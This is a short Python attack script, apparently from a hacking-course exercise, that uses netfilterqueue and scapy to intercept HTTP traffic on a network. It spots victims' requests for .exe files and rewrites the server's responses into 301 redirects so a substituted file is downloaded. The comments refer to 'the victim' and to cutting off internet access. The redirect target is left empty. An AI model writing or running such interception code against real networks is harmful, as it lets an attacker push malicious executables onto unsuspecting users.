#!/usr/bin/env/python3


import netfilterqueue
import scapy.all as scapy

ack_list = []
def set_load(scapy_packet,packet):
    scapy_packet[scapy.Raw].load = packet

    # print(scapy_packet.show())

    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.TCP].chksum
    del scapy_packet[scapy.IP].chksum
    return scapy_packet

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload()) # make the payload as a scapy packet
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # print("HTTP REQUEST")
            if ".exe" in str(scapy_packet[scapy.Raw].load):
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
            print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet=set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: ")

                packet.set_payload(str(modified_packet))

    # print(packet.get_payload()) # get_payload --> Actual content of the packet
    packet.accept() # The victim can access the sites
    # packet.drop() #Cut the internet

queue= netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet) #bind will make the variable 'queue' to bind with the queue which we ran on the terminal
queue.run()

